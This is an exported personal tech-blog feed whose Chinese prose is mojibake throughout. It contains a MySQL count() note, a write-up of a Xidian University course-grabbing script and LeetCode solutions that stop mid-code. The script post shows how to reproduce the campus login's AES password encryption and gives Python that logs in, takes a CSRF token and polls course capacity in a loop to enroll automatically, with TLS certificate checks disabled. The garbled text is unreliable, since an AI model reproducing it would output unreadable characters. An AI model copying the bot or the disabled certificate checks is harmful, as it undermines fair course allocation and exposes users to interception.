æ˜¯ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œå¯¹äºè¿”å›çš„ç»“æœé›†ï¼Œä¸€è¡Œè¡Œåœ°åˆ¤æ–­ï¼Œå¦‚æœ count å‡½æ•°çš„å‚æ•°ä¸æ˜¯NULLï¼Œç´¯è®¡å€¼å°±åŠ  1ï¼Œå¦åˆ™ä¸åŠ ï¼Œæœ€åè¿”å›ç´¯è®¡å€¼ã€‚</p><p>ç”¨æ³•ï¼šcountï¼ˆ*ï¼‰ã€countï¼ˆä¸»é”®ï¼‰ã€countï¼ˆå­—æ®µï¼‰ã€countï¼ˆæ•°å­—ï¼‰</p><table><thead><tr><th>countç”¨æ³•</th><th align="left">å«ä¹‰</th></tr></thead><tbody><tr><td>count(ä¸»é”®)</td><td align="left">InnoDB å¼•æ“ä¼šéå†æ•´å¼ è¡¨ï¼ŒæŠŠæ¯ä¸€è¡Œçš„ ä¸»é”®id å€¼éƒ½å–å‡ºæ¥ï¼Œè¿”å›ç»™æœåŠ¡å±‚ã€‚æœåŠ¡å±‚æ‹¿åˆ°ä¸»é”®åï¼Œç›´æ¥æŒ‰è¡Œè¿›è¡Œç´¯åŠ (ä¸»é”®ä¸å¯èƒ½ä¸ºnull)ã€‚</td></tr><tr><td>count(*)</td><td align="left">æ²¡æœ‰not null çº¦æŸ: InnoDB å¼•æ“ä¼šéå†æ•´å¼ è¡¨æŠŠæ¯ä¸€è¡Œçš„å­—æ®µå€¼éƒ½å–å‡ºæ¥ï¼Œè¿”å›ç»™æœåŠ¡å±‚ï¼ŒæœåŠ¡å±‚åˆ¤æ–­æ˜¯å¦ä¸ºnullï¼Œä¸ä¸ºnullï¼Œè®¡æ•°ç´¯åŠ ã€‚<br>æœ‰not null çº¦æŸ: InnoDBå¼•æ“ä¼šéå†æ•´å¼ è¡¨æŠŠæ¯ä¸€è¡Œçš„å­—æ®µå€¼éƒ½å–å‡ºæ¥ï¼Œè¿”å›ç»™æœåŠ¡å±‚ï¼Œç›´æ¥æŒ‰è¡Œè¿›è¡Œç´¯åŠ ã€‚</td></tr><tr><td>count(å­—æ®µ)</td><td align="left">InnoDB å¼•æ“éå†æ•´å¼ è¡¨ï¼Œä½†ä¸å–å€¼ã€‚æœåŠ¡å±‚å¯¹äºè¿”å›çš„æ¯ä¸€è¡Œï¼Œæ”¾ä¸€ä¸ªæ•°å­—â€™1â€™è¿›å»ï¼Œç›´æ¥æŒ‰è¡Œè¿›è¡Œç´¯åŠ ã€‚</td></tr><tr><td>count(æ•°å­—)</td><td align="left">InnoDBå¼•æ“å¹¶ä¸ä¼šæŠŠå…¨éƒ¨å­—æ®µå–å‡ºæ¥ï¼Œè€Œæ˜¯ä¸“é—¨åšäº†ä¼˜åŒ–ï¼Œä¸å–å€¼ï¼ŒæœåŠ¡å±‚ç›´æ¥æŒ‰è¡Œç´¯åŠ ã€‚</td></tr></tbody></table><p>æŒ‰ç…§æ•ˆç‡æ’åºçš„è¯ï¼Œcount(å­—æ®µ) &lt; count(ä¸»é”® id) &lt; count(1) â‰ˆ count(<em>)ï¼Œæ‰€ä»¥å°½é‡ä½¿ç”¨ count(\</em>)ã€‚ </p>]]></content>
    
    
    
    <tags>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XDU_choose_course</title>
    <link href="/2022/09/09/XDU-choose-course/"/>
    <url>/2022/09/09/XDU-choose-course/</url>
    
    <content type="html"><![CDATA[<h1 id="XDU-æŠ¢è¯¾è„šæœ¬"><a href="#XDU-æŠ¢è¯¾è„šæœ¬" class="headerlink" title="XDU æŠ¢è¯¾è„šæœ¬"></a>XDU æŠ¢è¯¾è„šæœ¬</h1><p><a href="https://github.com/sunzhengyu99/DailyClock_XDU_version">é¡¹ç›®åœ°å€</a></p><h2 id="1-ç™»å½•è®¤è¯"><a href="#1-ç™»å½•è®¤è¯" class="headerlink" title="1.ç™»å½•è®¤è¯"></a>1.ç™»å½•è®¤è¯</h2><h2 id="1-1-å¯†ç åŠ å¯†"><a href="#1-1-å¯†ç åŠ å¯†" class="headerlink" title="1.1 å¯†ç åŠ å¯†"></a>1.1 å¯†ç åŠ å¯†</h2><p>é¦–å…ˆåœ¨æµè§ˆå™¨ä¸­åœ¨åŒä¸€èº«ä»½çš„ä½ç½®è¿›è¡Œæ‰‹åŠ¨ç™»å½•å¯ä»¥å‘ç°å¦‚ä¸‹çš„è¯·æ±‚</p><ul><li>è¾“å…¥çš„å¯†ç å·²ç»è¢«åŠ å¯†</li><li>è¡¨å•å‚æ•°ä¸­å¤šäº†ä¸€ä¸ªexecutionå‚æ•°</li></ul><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220909130442.png" alt="image-20220909095403214"></p><p>åœ¨æµè§ˆå™¨æ‹¦æˆªçš„è¯·æ±‚ä¸­æœ‰ä¸€ä¸ª<code>encrypt.js</code>çš„æ–‡ä»¶ï¼ŒçŒœæµ‹æ˜¯ç”¨äºåŠ å¯†å¯†ç çš„</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909095645965.png" alt="image-20220909095645965"></p><p>è¯¥æ–‡ä»¶çš„ä»£ç å¾ˆé•¿ï¼Œä½†æ˜¯æ ¸å¿ƒçš„åŠ å¯†è¿‡ç¨‹å¦‚ä¸‹</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAesString</span>(<span class="hljs-params">data, key0, iv0</span>) </span>&#123;  key0 = key0.replace(<span class="hljs-regexp">/(^\s+)|(\s+$)/g</span>, <span class="hljs-string">&quot;&quot;</span>);  <span class="hljs-keyword">var</span> key = CryptoJS.enc.Utf8.parse(key0);  <span class="hljs-keyword">var</span> iv = CryptoJS.enc.Utf8.parse(iv0);  <span class="hljs-keyword">var</span> encrypted = CryptoJS.AES.encrypt(data, key, &#123;    iv: iv,    mode: CryptoJS.mode.CBC,    padding: CryptoJS.pad.Pkcs7  &#125;);  <span class="hljs-keyword">return</span> encrypted.toString();&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encryptAES</span>(<span class="hljs-params">data, aesKey</span>) </span>&#123;  <span class="hljs-keyword">if</span> (!aesKey) &#123;    <span class="hljs-keyword">return</span> data;  &#125;  <span class="hljs-keyword">var</span> encrypted = getAesString(    randomString(<span class="hljs-number">64</span>) + data,    aesKey,    randomString(<span class="hljs-number">16</span>)  );  <span class="hljs-keyword">return</span> encrypted;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encryptPassword</span>(<span class="hljs-params">pwd0, key</span>) </span>&#123;  <span class="hljs-keyword">try</span> &#123;    <span class="hljs-keyword">return</span> encryptAES(pwd0, key);  &#125; <span class="hljs-keyword">catch</span> (e) &#123;&#125;  <span class="hljs-keyword">return</span> pwd0;&#125;<span class="hljs-keyword">var</span> $aes_chars = <span class="hljs-string">&quot;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&quot;</span>;<span class="hljs-keyword">var</span> aes_chars_len = $aes_chars.length;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randomString</span>(<span class="hljs-params">len</span>) </span>&#123;  <span class="hljs-keyword">var</span> retStr = <span class="hljs-string">&quot;&quot;</span>;  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;    retStr += $aes_chars.charAt(<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * aes_chars_len));  &#125;  <span class="hljs-keyword">return</span> retStr;&#125;</code></pre><p>å¯ä»¥çœ‹å‡ºä½¿ç”¨çš„æ—¶AESçš„CBCæ¨¡å¼è¿›è¡ŒåŠ å¯†ï¼Œè€ŒAESåœ¨åŠ å¯†æ—¶éœ€è¦ä¸€ä¸ªå¯†é’¥ï¼Œè¿™ä¸ªå¯†é’¥åº”è¯¥æ˜¯éšè—åœ¨å‰ç«¯é¡µé¢ä¸­ï¼Œæ¯æ¬¡åˆ·æ–°éƒ½ä¼šæ›´æ–°ã€‚</p><p>æœç„¶åœ¨å‰ç«¯é¡µé¢ä¸­å¯ä»¥æ‰¾åˆ°<code>pwdEncryptSalt</code>å­—æ®µï¼Œå¹¶æŠŠ<code>execution</code>å­—æ®µä¹Ÿæ‰¾äº†å‡ºæ¥</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909100329173.png" alt="image-20220909100329173"></p><p>ä¸‹é¢å°±æ˜¯å†™å‡ºAESåŠ å¯†çš„è„šæœ¬(fe1w0å†™çš„)</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encryptPassword</span>(<span class="hljs-params">password, key</span>):</span>    <span class="hljs-comment"># password åŠ å¯†, è¯¥æ®µä»£ç å‚è€ƒäº https://github.com/EdenLin-c/CPdaily/blob/master/Jin.py</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randomString</span>(<span class="hljs-params"><span class="hljs-built_in">len</span></span>):</span>        retStr = <span class="hljs-string">&#x27;&#x27;</span>        i=<span class="hljs-number">0</span>        <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>:            retStr += aes_chars[(math.floor(random.random() * aes_chars_len))]            i=i+<span class="hljs-number">1</span>        <span class="hljs-keyword">return</span> retStr    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getAesString</span>(<span class="hljs-params">data,key,iv</span>):</span>        key = re.sub(<span class="hljs-string">&#x27;/(^\s+)|(\s+$)/g&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, key)        aes = AES.new(<span class="hljs-built_in">str</span>.encode(key),AES.MODE_CBC,<span class="hljs-built_in">str</span>.encode(iv))        pad_pkcs7 = pad(data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size, style=<span class="hljs-string">&#x27;pkcs7&#x27;</span>)        encrypted =aes.encrypt(pad_pkcs7)        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(base64.b64encode(encrypted),<span class="hljs-string">&#x27;utf-8&#x27;</span>)    aes_chars = <span class="hljs-string">&#x27;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&#x27;</span>    aes_chars_len = <span class="hljs-built_in">len</span>(aes_chars)    encrypted = getAesString(randomString(<span class="hljs-number">64</span>) + password, key, randomString(<span class="hljs-number">16</span>))    <span class="hljs-keyword">return</span> encrypted</code></pre><h2 id="1-2-è·å–session"><a href="#1-2-è·å–session" class="headerlink" title="1.2 è·å–session"></a>1.2 è·å–session</h2><p>ä¸‹é¢å°±æ˜¯ä½¿ç”¨requeseè·å–ç™»å½•çš„session</p><p>è®¾ç½®è¯·æ±‚å¤´</p><pre><code class="hljs python">headers = &#123;    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#x27;</span>,    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,    <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;max-age=0&#x27;</span>,    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,    <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;154&#x27;</span>,    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,    <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;ids.xidian.edu.cn&#x27;</span>,    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;http://ids.xidian.edu.cn&#x27;</span>,    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://ids.xidian.edu.cn/authserver/login&#x27;</span>,    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36&#x27;</span>,&#125;</code></pre><p>è·å–å‰ç«¯é¡µé¢çš„<code>pwdEncryptSalt</code>å­—æ®µå’Œ<code>execution</code>å­—æ®µï¼Œå¹¶å¯¹å¯†ç è¿›è¡ŒåŠ å¯†</p><pre><code class="hljs python">session_client = requests.Session()requests.packages.urllib3.disable_warnings()response = session_client.get(<span class="hljs-string">&quot;https://ids.xidian.edu.cn/authserver/login&quot;</span>)parse_html = etree.HTML(response.text)pwdEncryptSalt = parse_html.xpath(<span class="hljs-string">&#x27;//div//input[@id=&quot;pwdEncryptSalt&quot;]//@value&#x27;</span>)[<span class="hljs-number">0</span>]execution = parse_html.xpath(<span class="hljs-string">&#x27;//div//input[@id=&quot;execution&quot;]//@value&#x27;</span>)[<span class="hljs-number">0</span>]encrypt_passwrod = encryptPassword(password, pwdEncryptSalt)</code></pre><p>è®¾ç½®postè¯·æ±‚å‚æ•°</p><pre><code class="hljs python">post_data = &#123;<span class="hljs-string">&quot;username&quot;</span>: user_id,<span class="hljs-string">&quot;password&quot;</span>: encrypt_passwrod,<span class="hljs-string">&quot;captcha&quot;</span>: <span class="hljs-literal">None</span>,<span class="hljs-string">&quot;_eventId&quot;</span>: <span class="hljs-string">&quot;submit&quot;</span>,<span class="hljs-string">&quot;cllt&quot;</span>: <span class="hljs-string">&quot;userNameLogin&quot;</span>,<span class="hljs-string">&quot;dllt&quot;</span>: <span class="hljs-string">&quot;generalLogin&quot;</span>,<span class="hljs-string">&quot;lt&quot;</span>: <span class="hljs-literal">None</span>,<span class="hljs-string">&quot;execution&quot;</span>: execution&#125;sso_response = session_client.post(<span class="hljs-string">&quot;https://ids.xidian.edu.cn/authserver/login&quot;</span>, headers=headers, data=post_data,verify=<span class="hljs-literal">False</span>)</code></pre><h2 id="2-è·å–è¯¾ç¨‹åˆ—è¡¨"><a href="#2-è·å–è¯¾ç¨‹åˆ—è¡¨" class="headerlink" title="2.è·å–è¯¾ç¨‹åˆ—è¡¨"></a>2.è·å–è¯¾ç¨‹åˆ—è¡¨</h2><p>è¿›å…¥é€‰è¯¾å¹³å°åï¼Œèƒ½å¤Ÿçœ‹åˆ°<code>https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/loadJhnCourseInfo.do</code>è¿™æ ·ä¸€æ¡è¯·æ±‚ï¼ŒæŸ¥çœ‹æ•°å¯çŸ¥ï¼Œæ˜¯åŠ è½½è®¡åˆ’å†…é€‰è¯¾çš„api</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909101535786.png" alt="image-20220909101535786"></p><p>å†ä»”ç»†çœ‹æ‹¦æˆªçš„è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šè¯·æ±‚å‚æ•°</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909101655048.png" alt="image-20220909101655048"></p><p>ç¬¬ä¸€ä¸ªå°±æ˜¯æŸ¥è¯¢å…³é”®å­—å‚æ•°ï¼Œå³å°†æƒ³æŠ¢è¯¾çš„è¯¾ç¨‹ä»£ç æˆ–è¯¾ç¨‹åæ”¾åˆ°æ­¤å¤„å³å¯è·å–åˆ°ç›¸åº”çš„è¯¾ç¨‹ä¿¡æ¯ã€‚</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getCourseInfo</span>(<span class="hljs-params">session_client, course_KCDM</span>):</span>    <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    è·å–æŒ‡å®šè¯¾ç¨‹çš„è¯¦ç»†ä¿¡æ¯</span><span class="hljs-string">    :param session_client:</span><span class="hljs-string">    :param course_KCDM:</span><span class="hljs-string">    :return:</span><span class="hljs-string">    &quot;&quot;&quot;</span>    <span class="hljs-comment"># course_KCDM = &quot;&quot;</span>    course_infos = session_client.post(<span class="hljs-string">&quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/loadJhnCourseInfo.do?query_keyword=&quot;</span> + course_KCDM,  verify = <span class="hljs-literal">False</span>)    course_json = json.loads(course_infos.text)[<span class="hljs-string">&quot;datas&quot;</span>]    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(course_json) == <span class="hljs-number">0</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>    course_info = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> course_json:        <span class="hljs-keyword">if</span> course_KCDM == course[<span class="hljs-string">&quot;KCDM&quot;</span>]:            course_info = course            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">return</span> course_info</code></pre><h2 id="3-ç›‘æ§å®¹é‡å¹¶æŠ¢è¯¾"><a href="#3-ç›‘æ§å®¹é‡å¹¶æŠ¢è¯¾" class="headerlink" title="3.ç›‘æ§å®¹é‡å¹¶æŠ¢è¯¾"></a>3.ç›‘æ§å®¹é‡å¹¶æŠ¢è¯¾</h2><h2 id="3-1-é€‰è¯¾å‡½æ•°"><a href="#3-1-é€‰è¯¾å‡½æ•°" class="headerlink" title="3.1 é€‰è¯¾å‡½æ•°"></a>3.1 é€‰è¯¾å‡½æ•°</h2><p>è·å–è¯¾ç¨‹ä¿¡æ¯åï¼Œåªè¦åˆ¤æ–­è¯¾ç¨‹çš„å®¹é‡ä¸å½“å‰çš„é€‰è¯¾äººæ•°çš„å…³ç³»å³å¯è¿›è¡Œé€‰è¯¾ã€‚ç‚¹å‡»é€‰è¯¾æŒ‰é’®ï¼Œå‘é€çš„è¯·æ±‚å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åŠ å…¥<strong>csrfToken</strong>ï¼Œé‚£ä¹ˆå°±æƒ³åŠæ³•æ‰¾åˆ°å®ƒå°±èƒ½è¿›è¡Œé€‰è¯¾äº†ã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909102145303.png" alt="image-20220909102145303"></p><p>åœ¨åˆ·æ–°é€‰è¯¾é¡µé¢æ—¶ï¼Œä¼šå‡ºç°<code>https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkHome/loadPublicInfo_course.do</code>ï¼Œå…¶è¿”å›çš„æ•°æ®ä¸­å°±åŒ…å«äº†csrfToken</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909102441128.png" alt="image-20220909102441128"></p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">chooseCourse</span>(<span class="hljs-params">course_BJDM</span>):</span>    <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    é€‰è¯¾å‡½æ•°ï¼Œæ ¹æ®course_BJDMè¿›è¡Œé€‰è¯¾</span><span class="hljs-string">    :param course_BJDM:</span><span class="hljs-string">    :return:</span><span class="hljs-string">    &quot;&quot;&quot;</span>    csrf_token_url = <span class="hljs-string">&quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkHome/loadPublicInfo_course.do&quot;</span>    csrf_response = session_client.get(csrf_token_url).text    json_csrf_res = json.loads(csrf_response)    csrf_token = json_csrf_res.get(<span class="hljs-string">&quot;csrfToken&quot;</span>)    choose_course_url = <span class="hljs-string">&quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/choiceCourse.do?bjdm=&#123;0&#125;&amp;csrfToken=&#123;1&#125;&amp;lx=0&quot;</span>.<span class="hljs-built_in">format</span>(course_BJDM, csrf_token)    choose_response = session_client.get(choose_course_url, verify = <span class="hljs-literal">False</span>).text    <span class="hljs-comment"># print(choose_response)</span>    <span class="hljs-keyword">return</span> json.loads(choose_response)[<span class="hljs-string">&quot;code&quot;</span>]</code></pre><h2 id="3-2-ç›‘æ§å®¹é‡å¹¶æŠ¢è¯¾"><a href="#3-2-ç›‘æ§å®¹é‡å¹¶æŠ¢è¯¾" class="headerlink" title="3.2 ç›‘æ§å®¹é‡å¹¶æŠ¢è¯¾"></a>3.2 ç›‘æ§å®¹é‡å¹¶æŠ¢è¯¾</h2><p>ä¸ºäº†é˜²æ­¢ç™»å½•çš„sessionè¿‡æœŸå¯ä»¥è®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œæ¯ä¸ªåäºŒå°æ—¶å¯åŠ¨ä¸€æ¬¡è¯¥è„šæœ¬ã€‚</p><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    KCDM = course_KCDM    session_client = getSession()    course_info = getCourseInfo(session_client = session_client, course_KCDM = KCDM)    <span class="hljs-keyword">if</span> course_info == <span class="hljs-literal">None</span>:        print(<span class="hljs-string">&quot;[+] æœªæŸ¥è¯¢åˆ°è¯¾ç¨‹ä¿¡æ¯ï¼Œè¯·æ£€æŸ¥è¯¾ç¨‹ä»£ç ï¼&quot;</span>)        quit()    course_KXRS = course_info[<span class="hljs-string">&quot;KXRS&quot;</span>]  <span class="hljs-comment"># è¯¾ç¨‹æ€»å®¹é‡</span>    course_DQRS = course_info[<span class="hljs-string">&quot;DQRS&quot;</span>]  <span class="hljs-comment"># å½“å‰é€‰è¯¾äººæ•°</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        <span class="hljs-keyword">if</span> course_DQRS &lt; course_KXRS:            course_BJDM = course_info[<span class="hljs-string">&quot;BJDM&quot;</span>]            code = chooseCourse(course_BJDM)            <span class="hljs-keyword">if</span> code == <span class="hljs-number">1</span>:                print(<span class="hljs-string">&quot;[+] é€‰è¯¾æˆåŠŸ!&quot;</span>)                print(<span class="hljs-string">&quot;[+] è¯¾ç¨‹ä¿¡æ¯å¦‚ä¸‹:&quot;</span>)                printCourseInfo(course_info)                quit()            <span class="hljs-keyword">else</span>:                print(<span class="hljs-string">&quot;[+] é€‰è¯¾å¤±è´¥!&quot;</span>)        <span class="hljs-keyword">else</span>:            print(<span class="hljs-string">&quot;[+] å½“å‰è¯¾ç¨‹å®¹é‡å·²æ»¡!&quot;</span>)            time.sleep(sleep_time)    <span class="hljs-comment"># æ¯60sæŸ¥è¯¢ä¸€æ¬¡</span>            <span class="hljs-keyword">continue</span>        <span class="hljs-comment"># ç›‘æ§é€‰è¯¾äººæ•°çš„å˜åŒ–</span>        course_info = getCourseInfo(session_client=session_client, course_KCDM = KCDM)        course_KXRS = course_info[<span class="hljs-string">&quot;KXRS&quot;</span>]  <span class="hljs-comment"># è¯¾ç¨‹æ€»å®¹é‡</span>        course_DQRS = course_info[<span class="hljs-string">&quot;DQRS&quot;</span>]  <span class="hljs-comment"># å½“å‰é€‰è¯¾äººæ•°</span>    print(<span class="hljs-string">&quot;[+] Finish&quot;</span>)</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Daily_Algorithm</title>
    <link href="/2022/07/29/Daily-Algorithm/"/>
    <url>/2022/07/29/Daily-Algorithm/</url>
    
    <content type="html"><![CDATA[<h1 id="æ¯æ—¥åˆ·é¢˜"><a href="#æ¯æ—¥åˆ·é¢˜" class="headerlink" title="æ¯æ—¥åˆ·é¢˜"></a>æ¯æ—¥åˆ·é¢˜</h1><p>leetcodeæ¯æ—¥åˆ·é¢˜ï¼Œå…ˆå®šä¸ªå°ç›®æ ‡300</p><p><a href="https://github.com/sunzhengyu99/Daily-Algorithm">é¡¹ç›®åœ°å€</a></p><h1 id="é«˜çº§ç®—æ³•åˆ†æä¸è®¾è®¡è¯¾ç¨‹ä½œä¸š"><a href="#é«˜çº§ç®—æ³•åˆ†æä¸è®¾è®¡è¯¾ç¨‹ä½œä¸š" class="headerlink" title="é«˜çº§ç®—æ³•åˆ†æä¸è®¾è®¡è¯¾ç¨‹ä½œä¸š"></a>é«˜çº§ç®—æ³•åˆ†æä¸è®¾è®¡è¯¾ç¨‹ä½œä¸š</h1><h2 id="ä½œä¸šä¸€"><a href="#ä½œä¸šä¸€" class="headerlink" title="ä½œä¸šä¸€"></a>ä½œä¸šä¸€</h2><h3 id="ä¸¤æ•°ä¹‹å’Œï¼ˆåŠ›æ‰£ç¬¬1é¢˜ï¼‰"><a href="#ä¸¤æ•°ä¹‹å’Œï¼ˆåŠ›æ‰£ç¬¬1é¢˜ï¼‰" class="headerlink" title="ä¸¤æ•°ä¹‹å’Œï¼ˆåŠ›æ‰£ç¬¬1é¢˜ï¼‰"></a>ä¸¤æ•°ä¹‹å’Œï¼ˆåŠ›æ‰£ç¬¬1é¢˜ï¼‰</h3><blockquote><p>ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡ºå’Œä¸ºç›®æ ‡å€¼çš„é‚£ ä¸¤ä¸ª æ•´æ•°ï¼Œå¹¶è¿”å›ä»–ä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚</p><p>ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œä½ ä¸èƒ½é‡å¤åˆ©ç”¨è¿™ä¸ªæ•°ç»„ä¸­åŒæ ·çš„å…ƒç´ ã€‚</p><p>ç¤ºä¾‹:</p><p>ç»™å®š nums = [2, 7, 11, 15], target = 9</p><p>å› ä¸º nums[0] + nums[1] = 2 + 7 = 9</p><p>æ‰€ä»¥è¿”å› [0, 1]</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰</p><p>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/two-sum">https://leetcode-cn.com/problems/two-sum</a></p></blockquote><ul><li>æ€è·¯ä¸€ï¼šæš´åŠ›ï¼ŒäºŒé‡å¾ªç¯æœç´¢ç­”æ¡ˆï¼Œè‚¯å®šè¶…æ—¶</li><li>æ€è·¯äºŒï¼šä½¿ç”¨hashè¡¨ï¼Œå°†éå†è¿‡çš„æ•°æ®æ”¾å…¥hashè¡¨ä¸­ï¼Œ&lt;key , value&gt; ä¸º&lt;nums[i], i&gt;ç»“æ„</li></ul><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] twoSum(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;    HashMap&lt;Integer, Integer&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;        <span class="hljs-keyword">if</span>(map.containsKey(target - nums[i]))&#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;map.get(target - nums[i]), i&#125;;        &#125;        map.put(nums[i], i);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;&#125;</code></pre><h3 id="æœ€å¤§å­åºå’Œï¼ˆåŠ›æ‰£53é¢˜ï¼‰"><a href="#æœ€å¤§å­åºå’Œï¼ˆåŠ›æ‰£53é¢˜ï¼‰" class="headerlink" title="æœ€å¤§å­åºå’Œï¼ˆåŠ›æ‰£53é¢˜ï¼‰"></a>æœ€å¤§å­åºå’Œï¼ˆåŠ›æ‰£53é¢˜ï¼‰</h3><blockquote><p>ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums ï¼Œæ‰¾åˆ°ä¸€ä¸ªå…·æœ‰æœ€å¤§å’Œçš„è¿ç»­å­æ•°ç»„ï¼ˆå­æ•°ç»„æœ€å°‘åŒ…å«ä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œè¿”å›å…¶æœ€å¤§å’Œã€‚</p><p>ç¤ºä¾‹:</p><p>è¾“å…¥: [-2,1,-3,4,-1,2,1,-5,4],</p><p>è¾“å‡º: 6</p><p>è§£é‡Š: è¿ç»­å­æ•°ç»„ [4,-1,2,1] çš„å’Œæœ€å¤§ï¼Œä¸º 6ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰</p><p>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/maximum-subarray">https://leetcode-cn.com/problems/maximum-subarray</a></p></blockquote><p>æ€è·¯ï¼šåŠ¨æ€è§„åˆ’</p><ul><li><p>åˆ›å»ºdpæ•°ç»„ï¼Œdp[i]è¡¨ç¤ºéå†åˆ°iæ—¶ï¼Œç¬¬ iä¸ªæ•°ç»“å°¾çš„ è¿ç»­å­æ•°ç»„çš„æœ€å¤§å’Œ</p></li><li><p>åŠ¨æ€è½¬ç§»æ–¹ç¨‹</p><pre><code class="hljs inform7">dp<span class="hljs-comment">[i]</span> = max(dp<span class="hljs-comment">[i - 1]</span> + nums<span class="hljs-comment">[i]</span>, nums<span class="hljs-comment">[i]</span>);</code></pre></li><li><p>åˆå§‹åŒ–dp</p><pre><code class="hljs apache"><span class="hljs-attribute">dp</span>[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>]</code></pre></li><li><p>éå†é¡ºåºä¸ºä»å‰å‘å</p></li></ul><pre><code class="hljs 